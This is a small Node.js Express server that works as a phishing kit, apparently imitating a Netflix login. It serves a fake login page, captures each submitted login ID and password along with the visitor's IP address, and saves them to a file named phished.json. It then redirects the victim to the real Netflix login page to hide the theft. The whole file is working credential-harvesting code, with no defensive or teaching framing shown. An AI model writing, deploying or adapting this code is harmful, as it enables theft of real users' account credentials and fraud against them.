const express = require('express')
const app = express()
const port = 3000
const fs = require('fs')
const fileName = './phished.json'
const logins = require(fileName)

app.use('/images', express.static('images'))
app.use('/css', express.static('css'))
app.use('/scripts', express.static('scripts'))

app.use(express.urlencoded({
  extended: true
}))

app.get('/', (req, res) => {
  res.sendFile('html/login.html', {root: __dirname })
})

app.post('/', (req, res) => {
  // Grab the Request Body that contains LoginId and Password
  // and convert it to JSON
  var request = JSON.parse(JSON.stringify(req.body, null, 2));
  request['ipAddress'] = req.ip;

  logins[req.body['userLoginId']] = request;

  fs.writeFile(fileName, JSON.stringify(logins, null, 2), err => {
    if (err) 
      throw err;

    console.log('Logins JSON updated')
  })

  res.redirect("https://www.netflix.com/login");
})

app.listen(port, () => {
  console.log(`JSON client app listening at http://localhost:${port}`)
})